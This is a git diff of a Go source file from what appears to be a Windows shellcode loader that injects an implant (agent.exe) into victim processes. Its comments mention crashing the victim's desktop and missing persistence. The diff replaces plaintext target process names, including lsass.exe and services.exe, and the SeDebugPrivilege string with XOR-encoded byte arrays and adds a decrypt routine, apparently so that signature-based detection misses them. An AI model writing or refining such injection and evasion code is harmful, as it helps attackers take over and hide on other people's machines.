@@ -1,5 +1,6 @@
 //go:build windows
 // +build windows
+
 //进程注入存在问题，执行命令会导致受害者桌面崩溃，貌似是因为agent.exe太大
 //注释掉了winlogon.exe，添加了spoolsv.exe，目前测试不再崩溃
 //存在问题，loader貌似没有实现持久化
@@ -117,17 +118,16 @@ func Execute(shellcode []byte) error {
 func findTargetProcess() (uint32, string) {
 	// 优先级列表：优先选择高权限进程
 	targets := []string{
-		// SYSTEM 权限进程（如果 Loader 有足够权限）
-		//"winlogon.exe", // 登录进程，SYSTEM 权限
-		"spoolsv.exe",   //后台打印服务，SYSTEM 权限
-		"services.exe", // 服务控制管理器，SYSTEM 权限
-		"lsass.exe",    // 本地安全权限服务，SYSTEM 权限
+		// SYSTEM 权限进程
+		xorDecrypt([]byte{0x04, 0x07, 0x18, 0x18, 0x1b, 0x04, 0x01, 0x59, 0x12, 0x0f, 0x12}),       // spoolsv.exe
+		xorDecrypt([]byte{0x04, 0x12, 0x05, 0x01, 0x1e, 0x14, 0x12, 0x04, 0x59, 0x12, 0x0f, 0x12}), // services.exe
+		xorDecrypt([]byte{0x1b, 0x04, 0x16, 0x04, 0x04, 0x59, 0x12, 0x0f, 0x12}),                   // lsass.exe
 
-		// 次选：稳定的用户进程
-		"explorer.exe",      // 资源管理器，用户管理员权限
-		"svchost.exe",       // 系统服务，权限不定
-		"dllhost.exe",       // COM 代理进程
-		"RuntimeBroker.exe", // Win10+ 运行时代理
+		// 用户进程
+		xorDecrypt([]byte{0x12, 0x0f, 0x07, 0x1b, 0x18, 0x05, 0x12, 0x05, 0x59, 0x12, 0x0f, 0x12}),                               // explorer.exe
+		xorDecrypt([]byte{0x04, 0x01, 0x14, 0x1f, 0x18, 0x04, 0x03, 0x59, 0x12, 0x0f, 0x12}),                                     // svchost.exe
+		xorDecrypt([]byte{0x13, 0x1b, 0x1b, 0x1f, 0x18, 0x04, 0x03, 0x59, 0x12, 0x0f, 0x12}),                                     // dllhost.exe
+		xorDecrypt([]byte{0x25, 0x02, 0x19, 0x03, 0x1e, 0x1a, 0x12, 0x35, 0x05, 0x18, 0x1c, 0x12, 0x05, 0x59, 0x12, 0x0f, 0x12}), // RuntimeBroker.exe
 	}
 
 	fmt.Println("[*] 扫描可注入进程...")
@@ -200,7 +200,8 @@ func enableSeDebugPrivilege() error {
 
 	// 查找 SeDebugPrivilege 的 LUID
 	var luid windows.LUID
-	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeDebugPrivilege"), &luid)
+	privName := xorDecrypt([]byte{0x24, 0x12, 0x33, 0x12, 0x15, 0x02, 0x10, 0x27, 0x05, 0x1e, 0x01, 0x1e, 0x1b, 0x12, 0x10, 0x12})
+	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(privName), &luid)
 	if err != nil {
 		return fmt.Errorf("failed to lookup privilege: %v", err)
 	}
@@ -262,4 +263,14 @@ func getProcessPrivilegeLevel(pid uint32) string {
 	}
 
 	return "User (普通用户)"
+}
+
+// xorDecrypt 简单的 XOR 解密函数
+func xorDecrypt(data []byte) string {
+	key := byte(0x77)
+	decrypted := make([]byte, len(data))
+	for i, b := range data {
+		decrypted[i] = b ^ key
+	}
+	return string(decrypted)
 }
